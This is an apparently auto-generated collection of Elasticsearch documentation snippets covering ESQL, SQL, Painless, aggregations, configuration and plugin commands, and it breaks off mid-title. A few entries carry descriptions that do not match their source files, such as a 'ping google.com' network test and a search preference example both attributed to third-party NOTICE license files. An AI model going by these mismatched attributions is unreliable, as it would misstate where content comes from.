Constant Keyword Document Values Field\nDESCRIPTION: Java class definition for a constant keyword document values field with a dynamic type annotation in Elasticsearch's XPack module\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/mapper-constant-keyword/src/main/resources/org/elasticsearch/xpack/constantkeyword/org.elasticsearch.xpack.constantkeyword.txt#2025-04-21_snippet_0\n\nLANGUAGE: java\nCODE:\n```\nclass org.elasticsearch.xpack.constantkeyword.ConstantKeywordDocValuesField @dynamic_type {}\n```\n\n----------------------------------------\n\nTITLE: ESQL Query Exceeding Maximum Limit\nDESCRIPTION: Illustrates an ESQL query attempting to return more than the maximum allowed 10,000 rows.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/common/result-set-size-limitation.md#2025-04-21_snippet_2\n\nLANGUAGE: esql\nCODE:\n```\nFROM index | WHERE field0 == \"value\" | LIMIT 20000\n```\n\n----------------------------------------\n\nTITLE: Including GREATEST Function Types in Markdown\nDESCRIPTION: This snippet includes the content of a separate Markdown file containing the types information for the GREATEST function.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/layout/greatest.md#2025-04-21_snippet_2\n\nLANGUAGE: markdown\nCODE:\n```\n:::{include} ../types/greatest.md\n:::\n```\n\n----------------------------------------\n\nTITLE: Debugging _source Context in Update API\nDESCRIPTION: Demonstrates using Debug.explain to inspect the _source context object in an update script.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/painless-debugging.md#2025-04-21_snippet_3\n\nLANGUAGE: console\nCODE:\n```\nPOST /hockey/_update/1\n{\n  \"script\": \"Debug.explain(ctx._source)\"\n}\n```\n\n----------------------------------------\n\nTITLE: Downloading Configuration File using cURL\nDESCRIPTION: Command to download the sample configuration file for the Google Cloud Storage connector from GitHub.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-google-cloud.md#2025-04-21_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\ncurl https://raw.githubusercontent.com/elastic/connectors/main/config.yml.example --output ~/connectors-config/config.yml\n```\n\n----------------------------------------\n\nTITLE: Building Elasticsearch Distribution Commands\nDESCRIPTION: Terminal commands for building different distribution formats of Elasticsearch using Gradle. Includes commands for darwin-tar and all artifacts.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/CONTRIBUTING.md#2025-04-21_snippet_19\n\nLANGUAGE: bash\nCODE:\n```\n./gradlew -p distribution/archives/darwin-tar assemble\n```\n\nLANGUAGE: bash\nCODE:\n```\n./gradlew assemble\n```\n\n----------------------------------------\n\nTITLE: Parsing ISO 8601 DateTime\nDESCRIPTION: Shows how to parse an ISO 8601 formatted datetime string into a ZonedDateTime object.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/using-datetime-in-painless.md#2025-04-21_snippet_1\n\nLANGUAGE: painless\nCODE:\n```\nString datetime = '1983-10-13T22:15:30Z';\nZonedDateTime zdt = ZonedDateTime.parse(datetime);\n```\n\n----------------------------------------\n\nTITLE: File Extension Search Examples\nDESCRIPTION: Demonstrates different approaches to searching for file extensions, comparing function-based and field-based methods.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/eql/eql-syntax.md#2025-04-21_snippet_26\n\nLANGUAGE: eql\nCODE:\n```\nfile where endsWith(file.path,\".exe\") or endsWith(file.path,\".dll\")\n```\n\nLANGUAGE: eql\nCODE:\n```\nfile where file.extension in (\"exe\", \"dll\")\n```\n\n----------------------------------------\n\nTITLE: Python script for indexing CBOR data with attachment processor\nDESCRIPTION: Python script demonstrating how to read a file, encode it as CBOR, and send it to Elasticsearch using the attachment processor pipeline.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/enrich-processor/attachment.md#2025-04-21_snippet_7\n\nLANGUAGE: python\nCODE:\n```\nimport cbor2\nimport requests\n\nfile = 'my-file'\nheaders = {'content-type': 'application/cbor'}\n\nwith open(file, 'rb') as f:\n  doc = {\n    'data': f.read()\n  }\n  requests.put(\n    'http://localhost:9200/my-index-000001/_doc/my_id?pipeline=cbor-attachment',\n    data=cbor2.dumps(doc),\n    headers=headers\n  )\n```\n\n----------------------------------------\n\nTITLE: MessageDigest Cloning Restriction\nDESCRIPTION: Restricts usage of the MessageDigest clone method, preferring a custom implementation for better control.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/build-tools-internal/src/main/resources/forbidden/es-all-signatures.txt#2025-04-21_snippet_2\n\nLANGUAGE: java\nCODE:\n```\njava.security.MessageDigest#clone() @ use org.elasticsearch.common.hash.MessageDigests\n```\n\n----------------------------------------\n\nTITLE: Example Reference Type Definition in Painless\nDESCRIPTION: Definition of Example class with member fields used in field access examples.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/painless-operators-reference.md#2025-04-21_snippet_3\n\nLANGUAGE: painless\nCODE:\n```\nname:\n  Example\n\nnon-static member fields:\n  * int x\n  * def y\n  * List z\n```\n\n----------------------------------------\n\nTITLE: HTTPS Connection Properties Entitlement Example\nDESCRIPTION: Example of configuring HTTPS connection properties modification permissions for a plugin module.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/extend/creating-classic-plugins.md#2025-04-21_snippet_4\n\nLANGUAGE: yaml\nCODE:\n```\norg.example.module: # or 'ALL-UNNAMED' if the plugin is non-modular\n  - set_https_connection_properties\n```\n\n----------------------------------------\n\nTITLE: RTRIM Function Header Comment\nDESCRIPTION: Generated file header comment indicating this is auto-generated documentation for ESQL's RTRIM function.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/layout/rtrim.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n% This is generated by ESQL's AbstractFunctionTestCase. Do no edit it. See ../README.md for how to regenerate it.\n```\n\n----------------------------------------\n\nTITLE: Method Disassembly Command\nDESCRIPTION: Gradle command for disassembling a specific method using JVM options\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/benchmarks/README.md#2025-04-21_snippet_3\n\nLANGUAGE: bash\nCODE:\n```\ngradlew -p benchmarks run --args ' MemoryStatsBenchmark -jvmArgs \"-XX:+UnlockDiagnosticVMOptions -XX:CompileCommand=print,*.yourMethodName -XX:PrintAssemblyOptions=intel\"'\n```\n\n----------------------------------------\n\nTITLE: Match Phrase Query with Custom Analyzer\nDESCRIPTION: Shows how to specify a custom analyzer for text analysis in a match phrase query\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-match-query-phrase.md#2025-04-21_snippet_1\n\nLANGUAGE: console\nCODE:\n```\nGET /_search\n{\n  \"query\": {\n    \"match_phrase\": {\n      \"message\": {\n        \"query\": \"this is a test\",\n        \"analyzer\": \"my_analyzer\"\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Basic Sum Bucket Aggregation Syntax\nDESCRIPTION: Demonstrates the basic structure of a sum bucket aggregation that calculates sums across specified buckets.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-pipeline-sum-bucket-aggregation.md#2025-04-21_snippet_0\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"sum_bucket\": {\n    \"buckets_path\": \"the_sum\"\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Removing Korean (nori) Analysis Plugin from Elasticsearch\nDESCRIPTION: Command to remove the Korean (nori) analysis plugin from Elasticsearch. The node must be stopped before removing the plugin.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch-plugins/analysis-nori.md#2025-04-21_snippet_1\n\nLANGUAGE: sh\nCODE:\n```\nsudo bin/elasticsearch-plugin remove analysis-nori\n```\n\n----------------------------------------\n\nTITLE: ESQL RENAME Command Syntax\nDESCRIPTION: Basic syntax for the RENAME command in ESQL. Shows how to rename one or multiple columns using the AS keyword.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/commands/layout/rename.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nRENAME old_name1 AS new_name1[, ..., old_nameN AS new_nameN]\n```\n\n----------------------------------------\n\nTITLE: Copyright Disclaimer Template\nDESCRIPTION: Sample template for a copyright disclaimer from an employer or organization.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/ingest-attachment/licenses/tika-parser-miscoffice-module-NOTICE.txt#2025-04-21_snippet_2\n\nLANGUAGE: text\nCODE:\n```\nYoyodyne, Inc., hereby disclaims all copyright interest in the\nprogram `Gnomovision' (which makes passes at compilers) written by\nJames Hacker.\n\nsignature of Ty Coon, 1 April 1989\nTy Coon, President of Vice\n```\n\n----------------------------------------\n\nTITLE: Output Document After Dot Expansion\nDESCRIPTION: Shows the transformed document after the dot expander processor converts the dotted field into a nested structure.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/enrich-processor/dot-expand-processor.md#2025-04-21_snippet_2\n\nLANGUAGE: js\nCODE:\n```\n{\n  \"foo\" : {\n    \"bar\" : \"value\"\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Field Access Examples in Painless\nDESCRIPTION: Demonstrates field access operations using the Example type.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/painless-operators-reference.md#2025-04-21_snippet_4\n\nLANGUAGE: painless\nCODE:\n```\nExample example = new Example();\nexample.x = 1;\nexample.y = example.x;\nexample.z = new ArrayList();\nexample.z.add(1);\nexample.x = example.z.get(0);\n```\n\n----------------------------------------\n\nTITLE: URL Decoding Method in Painless\nDESCRIPTION: This method signature demonstrates how to use the URL decode processor to decode a URL-encoded string.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/using-ingest-processors-in-painless.md#2025-04-21_snippet_6\n\nLANGUAGE: painless\nCODE:\n```\nString urlDecode(String value);\n```\n\n----------------------------------------\n\nTITLE: ESQL Operator Reference Links in Markdown\nDESCRIPTION: A structured list of markdown links to documentation for various ESQL operators including comparison operators (=, !=, <, <=, >, >=) and arithmetic operators (+, -, *, /, %).\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/lists/binary-operators.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n* [Equality](../../functions-operators/operators.md#esql-equals)\n* [Inequality `!=`](../../functions-operators/operators.md#esql-not_equals)\n* [Less than `<`](../../functions-operators/operators.md#esql-less_than)\n* [Less than or equal to `<=`](../../functions-operators/operators.md#esql-less_than_or_equal)\n* [Greater than `>`](../../functions-operators/operators.md#esql-greater_than)\n* [Greater than or equal to `>=`](../../functions-operators/operators.md#esql-greater_than_or_equal)\n* [Add `+`](../../functions-operators/operators.md#esql-add)\n* [Subtract `-`](../../functions-operators/operators.md#esql-sub)\n* [Multiply `*`](../../functions-operators/operators.md#esql-mul)\n* [Divide `/`](../../functions-operators/operators.md#esql-div)\n* [Modulus `%`](../../functions-operators/operators.md#esql-mod)\n```\n\n----------------------------------------\n\nTITLE: Configuring SMTP Host in Elasticsearch YAML\nDESCRIPTION: Specifies the SMTP server to connect to. This setting is required for email notifications to work.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/configuration-reference/watcher-settings.md#2025-04-21_snippet_10\n\nLANGUAGE: yaml\nCODE:\n```\nsmtp.host\n```\n\n----------------------------------------\n\nTITLE: Documentation Structure Comment in Markdown\nDESCRIPTION: Initial comment indicating the auto-generated nature of the documentation file and referencing the regeneration instructions.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/layout/mv_sort.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n% This is generated by ESQL's AbstractFunctionTestCase. Do no edit it. See ../README.md for how to regenerate it.\n```\n\n----------------------------------------\n\nTITLE: Adding Secret Token to Elasticsearch Keystore\nDESCRIPTION: Command to add APM server authentication token to the Elasticsearch keystore for secure communication.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/TRACING.md#2025-04-21_snippet_1\n\nLANGUAGE: bash\nCODE:\n```\nbin/elasticsearch-keystore add telemetry.secret_token\n```\n\n----------------------------------------\n\nTITLE: Lowercase Conversion Method in Painless\nDESCRIPTION: This method signature demonstrates the use of the lowercase processor to convert a string to its lowercase equivalent.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/using-ingest-processors-in-painless.md#2025-04-21_snippet_2\n\nLANGUAGE: painless\nCODE:\n```\nString lowercase(String value);\n```\n\n----------------------------------------\n\nTITLE: Environment Variable JVM Configuration\nDESCRIPTION: Shows how to set JVM options using the ES_JAVA_OPTS environment variable for development environments.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/jvm-settings.md#2025-04-21_snippet_2\n\nLANGUAGE: sh\nCODE:\n```\nexport ES_JAVA_OPTS=\"$ES_JAVA_OPTS -Djava.io.tmpdir=/path/to/temp/dir\"\n./bin/elasticsearch\n```\n\n----------------------------------------\n\nTITLE: Single-Quoted String Examples\nDESCRIPTION: Demonstrates string literals using single quotes with various escape sequences.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/painless-literals.md#2025-04-21_snippet_5\n\nLANGUAGE: painless\nCODE:\n```\n'single-quoted string literal'\n'\\'single-quoted with escaped single-quotes\\' and backslash \\\\'\n'single-quoted with non-escaped \"double-quotes\"'\n```\n\n----------------------------------------\n\nTITLE: Basic Subquery Select Operations\nDESCRIPTION: Basic SELECT operations using subqueries in Elasticsearch SQL, demonstrating simple field selection and aliasing\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/sql/src/test/resources/org/elasticsearch/xpack/sql/planner/querytranslator_subqueries_tests.txt#2025-04-21_snippet_0\n\nLANGUAGE: sql\nCODE:\n```\nSELECT int FROM\n    (SELECT int FROM test);\n```\n\n----------------------------------------\n\nTITLE: ESQL FROM Query for Remote Clusters\nDESCRIPTION: Demonstrates how to query data streams and indices on remote clusters using the FROM command.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/commands/layout/from.md#2025-04-21_snippet_4\n\nLANGUAGE: esql\nCODE:\n```\nFROM cluster_one:employees-00001,cluster_two:other-employees-*\n```\n\n----------------------------------------\n\nTITLE: Filter Output for Emoticon Replacement\nDESCRIPTION: The output text produced by the custom mapping character filter after replacing the sad emoticon with the text '_sad_'.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-mapping-charfilter.md#2025-04-21_snippet_4\n\nLANGUAGE: text\nCODE:\n```\n[ I'm delighted about it _sad_ ]\n```\n\n----------------------------------------\n\nTITLE: Including MV_MIN Function Types in Markdown\nDESCRIPTION: This snippet includes the supported types for the MV_MIN function from a separate markdown file.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/layout/mv_min.md#2025-04-21_snippet_2\n\nLANGUAGE: markdown\nCODE:\n```\n:::{include} ../types/mv_min.md\n:::\n```\n\n----------------------------------------\n\nTITLE: Including GREATEST Function Description in Markdown\nDESCRIPTION: This snippet includes the content of a separate Markdown file containing the description for the GREATEST function.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/layout/greatest.md#2025-04-21_snippet_1\n\nLANGUAGE: markdown\nCODE:\n```\n:::{include} ../description/greatest.md\n:::\n```\n\n----------------------------------------\n\nTITLE: IOUtils Usage Restriction\nDESCRIPTION: Recommends using Elasticsearch's internal IO utility classes instead of Apache Lucene's IOUtils.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/build-tools-internal/src/main/resources/forbidden/es-all-signatures.txt#2025-04-21_snippet_5\n\nLANGUAGE: java\nCODE:\n```\norg.apache.lucene.util.IOUtils @ use @org.elasticsearch.core.internal.io instead\n```\n\n----------------------------------------\n\nTITLE: Cross-Cluster Search with Pattern Matching in Elasticsearch SQL\nDESCRIPTION: Example of performing a cross-cluster search using wildcards in cluster names and index patterns.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-index-patterns.md#2025-04-21_snippet_2\n\nLANGUAGE: sql\nCODE:\n```\nSELECT emp_no FROM \"my*cluster:*emp\" LIMIT 1;\n```\n\n----------------------------------------\n\nTITLE: Java Dependency Declaration\nDESCRIPTION: Maven/Gradle dependency declaration for javax.activation compatibility with Java versions greater than 8\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/ingest-attachment/licenses/tika-core-NOTICE.txt#2025-04-21_snippet_3\n\nLANGUAGE: text\nCODE:\n```\ncom.sun.activation:javax.activation\n```\n\n----------------------------------------\n\nTITLE: Parsing RFC 1123 DateTime\nDESCRIPTION: Demonstrates parsing an RFC 1123 formatted datetime string using a built-in DateTimeFormatter.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/using-datetime-in-painless.md#2025-04-21_snippet_2\n\nLANGUAGE: painless\nCODE:\n```\nString datetime = 'Thu, 13 Oct 1983 22:15:30 GMT';\nZonedDateTime zdt = ZonedDateTime.parse(datetime,\n        DateTimeFormatter.RFC_1123_DATE_TIME);\n```\n\n----------------------------------------\n\nTITLE: Conditional Function Transformations\nDESCRIPTION: Examples of IIF, COALESCE, NULLIF, and CASE expressions in SQL queries.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/sql/src/test/resources/org/elasticsearch/xpack/sql/planner/querytranslator_tests.txt#2025-04-21_snippet_12\n\nLANGUAGE: sql\nCODE:\n```\nSELECT IIF(int > 20, 'foo', 'bar') FROM test GROUP BY 1;\n```\n\nLANGUAGE: json\nCODE:\n```\nInternalQlScriptUtils.nullSafeFilter(InternalQlScriptUtils.gt(InternalQlScriptUtils.docValue(doc,params.v0),params.v1))?params.v2:params.v3\n```\n\n----------------------------------------\n\nTITLE: Using Default Column Naming in ESQL STATS\nDESCRIPTION: Demonstrates how omitting the column name in STATS results in the expression being used as the column name.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/commands/layout/stats-by.md#2025-04-21_snippet_11\n\nLANGUAGE: esql\nCODE:\n```\nFROM employees\nSTATS AVG(salary)\nBY department;\n```\n\n----------------------------------------\n\nTITLE: Basic Cumulative Sum Aggregation Structure\nDESCRIPTION: Shows the basic structure of a cumulative sum aggregation that references another metric via buckets_path.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-pipeline-cumulative-sum-aggregation.md#2025-04-21_snippet_0\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"cumulative_sum\": {\n    \"buckets_path\": \"the_sum\"\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Including LEAST Function Examples in Markdown\nDESCRIPTION: This code snippet includes usage examples for the LEAST function from a separate markdown file.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/layout/least.md#2025-04-21_snippet_3\n\nLANGUAGE: markdown\nCODE:\n```\n:::{include} ../examples/least.md\n:::\n```\n\n----------------------------------------\n\nTITLE: Outbound Network Entitlement Example\nDESCRIPTION: Configuration example for granting outbound network access to a plugin module.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/extend/creating-classic-plugins.md#2025-04-21_snippet_3\n\nLANGUAGE: yaml\nCODE:\n```\norg.example.module: # or 'ALL-UNNAMED' if the plugin is non-modular\n  - outbound_network\n```\n\n----------------------------------------\n\nTITLE: Executing Gradle Test Command for Elasticsearch Docs\nDESCRIPTION: Command to run tests for all documentation snippets or for a specific page using Gradle.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/README.md#2025-04-21_snippet_1\n\nLANGUAGE: shell\nCODE:\n```\n./gradlew -pdocs check\n```\n\nLANGUAGE: shell\nCODE:\n```\n./gradlew -pdocs yamlRestTest --tests \"*rollover*\"\n```\n\n----------------------------------------\n\nTITLE: Testing Network Configuration in Linux\nDESCRIPTION: Command to test network connectivity to external hosts, used to verify proper network configuration in the test environment.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/repository-gcs/licenses/failureaccess-NOTICE.txt#2025-04-21_snippet_3\n\nLANGUAGE: bash\nCODE:\n```\nping google.com\n```\n\n----------------------------------------\n\nTITLE: JSON Manipulation API in Elasticsearch Scripts\nDESCRIPTION: Provides methods for loading and dumping JSON data within Elasticsearch scripts, with optional formatting control\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/lang-painless/src/main/resources/org/elasticsearch/painless/org.elasticsearch.script.update_by_query.txt#2025-04-21_snippet_1\n\nLANGUAGE: java\nCODE:\n```\nclass org.elasticsearch.painless.api.Json {\n  def load(String)\n  String dump(def)\n  String dump(def, boolean)\n}\n```\n\n----------------------------------------\n\nTITLE: Using Custom String Preference Parameter in Elasticsearch\nDESCRIPTION: Demonstrates using a custom string as preference parameter value to ensure consistent shard selection across different search requests.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/security/licenses/slf4j-api-NOTICE.txt#2025-04-21_snippet_4\n\nLANGUAGE: text\nCODE:\n```\npreference=xyzabc\n```\n\n----------------------------------------\n\nTITLE: Geo Functions Implementation\nDESCRIPTION: Geographic functions including ST_AsWKT, ST_WKTToSQL, and ST_Distance operations.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/sql/src/test/resources/org/elasticsearch/xpack/sql/planner/querytranslator_tests.txt#2025-04-21_snippet_13\n\nLANGUAGE: sql\nCODE:\n```\nSELECT ST_AsWKT(point) FROM test WHERE ST_AsWKT(point) = 'point (10 20)';\n```\n\nLANGUAGE: json\nCODE:\n```\nInternalQlScriptUtils.nullSafeFilter(InternalQlScriptUtils.eq(InternalSqlScriptUtils.stAswkt(InternalSqlScriptUtils.geoDocValue(doc,params.v0)),params.v1)\n```\n\n----------------------------------------\n\nTITLE: Custom ICU Tokenizer Rule File Example\nDESCRIPTION: This snippet shows the content of a custom rule file for the ICU tokenizer. The rule '.+ {200};' treats the entire input as a single token.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch-plugins/analysis-icu-tokenizer.md#2025-04-21_snippet_1\n\nLANGUAGE: text\nCODE:\n```\n.+ {200};\n```\n\n----------------------------------------\n\nTITLE: Executing elasticsearch-setup-passwords Command in Shell\nDESCRIPTION: Synopsis showing the usage of the elasticsearch-setup-passwords command with its available options and parameters.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/command-line-tools/setup-passwords.md#2025-04-21_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\nbin/elasticsearch-setup-passwords auto|interactive\n[-b, --batch] [-h, --help] [-E <KeyValuePair>]\n[-s, --silent] [-u, --url \"<URL>\"] [-v, --verbose]\n```\n\n----------------------------------------\n\nTITLE: Basic COUNT_DISTINCT Usage in ESQL\nDESCRIPTION: Demonstrates the basic usage of COUNT_DISTINCT function to count unique values in multiple columns from a 'hosts' table.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/examples/count_distinct.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nFROM hosts\n| STATS COUNT_DISTINCT(ip0), COUNT_DISTINCT(ip1)\n```\n\n----------------------------------------\n\nTITLE: Configuring Fixed Thread Pool in Elasticsearch\nDESCRIPTION: Configuration example for a fixed thread pool type with size and queue size parameters\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/configuration-reference/thread-pool-settings.md#2025-04-21_snippet_1\n\nLANGUAGE: yaml\nCODE:\n```\nthread_pool:\n    write:\n        size: 30\n        queue_size: 1000\n```\n\n----------------------------------------\n\nTITLE: Including MV_MIN Function Description in Markdown\nDESCRIPTION: This snippet includes the description of the MV_MIN function from a separate markdown file.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/layout/mv_min.md#2025-04-21_snippet_1\n\nLANGUAGE: markdown\nCODE:\n```\n:::{include} ../description/mv_min.md\n:::\n```\n\n----------------------------------------\n\nTITLE: Grammar Definition for Equality Not Equals Operator\nDESCRIPTION: Formal grammar specification for the equality not equals operator in Painless language.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/painless-operators-boolean.md#2025-04-21_snippet_16\n\nLANGUAGE: text\nCODE:\n```\nequality_not_equals: expression '!=' expression;\n```\n\n----------------------------------------\n\nTITLE: Opening Elasticsearch Logging Configuration\nDESCRIPTION: Opens the Elasticsearch logging configuration file to modify log levels for enhanced troubleshooting.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch-plugins/discovery-gce-usage-long.md#2025-04-21_snippet_11\n\nLANGUAGE: sh\nCODE:\n```\nsudo vi /etc/elasticsearch/log4j2.properties\n```\n\n----------------------------------------\n\nTITLE: Complex Multi-level Subqueries\nDESCRIPTION: Multiple nested subqueries with aliasing, grouping, and ordering\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/sql/src/test/resources/org/elasticsearch/xpack/sql/planner/querytranslator_subqueries_tests.txt#2025-04-21_snippet_3\n\nLANGUAGE: sql\nCODE:\n```\nSELECT j AS k FROM (\n    SELECT i AS j FROM (\n        SELECT int AS i FROM test\n    )\n) GROUP BY k;\n```\n\n----------------------------------------\n\nTITLE: Grouping by Multivalued Keys in ESQL STATS\nDESCRIPTION: Demonstrates how grouping by a multivalued key places the input row in all relevant groups.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/commands/layout/stats-by.md#2025-04-21_snippet_6\n\nLANGUAGE: esql\nCODE:\n```\nFROM employees\nSTATS count(*)\nBY languages;\n```\n\n----------------------------------------\n\nTITLE: Flattened Version of the Sub-Select\nDESCRIPTION: The flattened equivalent of the supported sub-select query, showing how Elasticsearch SQL processes such queries.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-limitations.md#2025-04-21_snippet_7\n\nLANGUAGE: sql\nCODE:\n```\ninclude-tagged::{sql-specs}/docs/docs.csv-spec[limitationSubSelectRewritten]\n```\n\n----------------------------------------\n\nTITLE: Including BUCKET Function Parameters in Markdown\nDESCRIPTION: This snippet includes the parameters section for the BUCKET function from an external markdown file.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/layout/bucket.md#2025-04-21_snippet_1\n\nLANGUAGE: markdown\nCODE:\n```\n:::{include} ../parameters/bucket.md\n:::\n```\n\n----------------------------------------\n\nTITLE: Language Analyzers in Elasticsearch\nDESCRIPTION: Specialized analyzers for specific languages like English and French, providing language-specific text analysis.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analyzer-reference.md#2025-04-21_snippet_6\n\nLANGUAGE: elasticsearch\nCODE:\n```\n\"analyzer\": \"english\"\n```\n\n----------------------------------------\n\nTITLE: Documentation Header Comment\nDESCRIPTION: Header comment indicating the file is auto-generated by ESQL's AbstractFunctionTestCase\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/layout/date_parse.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n% This is generated by ESQL's AbstractFunctionTestCase. Do no edit it. See ../README.md for how to regenerate it.\n```\n\n----------------------------------------\n\nTITLE: MV_APPEND Function Comment Header\nDESCRIPTION: Header comment indicating that this is auto-generated documentation for ESQL's AbstractFunctionTestCase\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/layout/mv_append.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n% This is generated by ESQL's AbstractFunctionTestCase. Do no edit it. See ../README.md for how to regenerate it.\n```\n\n----------------------------------------\n\nTITLE: Basic GROK Syntax in ESQL\nDESCRIPTION: Basic syntax example of the GROK command showing the required input and pattern parameters.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/commands/layout/grok.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nGROK input \"pattern\"\n```\n\n----------------------------------------\n\nTITLE: Using TESTSETUP and TEARDOWN Markers in Elasticsearch Docs\nDESCRIPTION: Examples of using TESTSETUP and TEARDOWN markers for setting up and cleaning up test environments.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/README.md#2025-04-21_snippet_5\n\nLANGUAGE: markdown\nCODE:\n```\n% TESTSETUP\n// TEARDOWN\n```\n\n----------------------------------------\n\nTITLE: Retrieving Async Search Results in Elasticsearch\nDESCRIPTION: Command to retrieve the results of an asynchronous search in Elasticsearch using the search ID.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-bucket-frequent-item-sets-aggregation.md#2025-04-21_snippet_2\n\nLANGUAGE: console\nCODE:\n```\nGET /_async_search/<id>\n```\n\n----------------------------------------\n\nTITLE: Installing Elasticsearch Plugin from HTTP URL\nDESCRIPTION: This command installs an Elasticsearch plugin from an HTTP URL.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch-plugins/plugin-management-custom-url.md#2025-04-21_snippet_3\n\nLANGUAGE: shell\nCODE:\n```\nsudo bin/elasticsearch-plugin install https://some.domain/path/to/plugin.zip\n```\n\n----------------------------------------\n\nTITLE: Ordered All_Of Rule with Max_Gaps in Elasticsearch Intervals 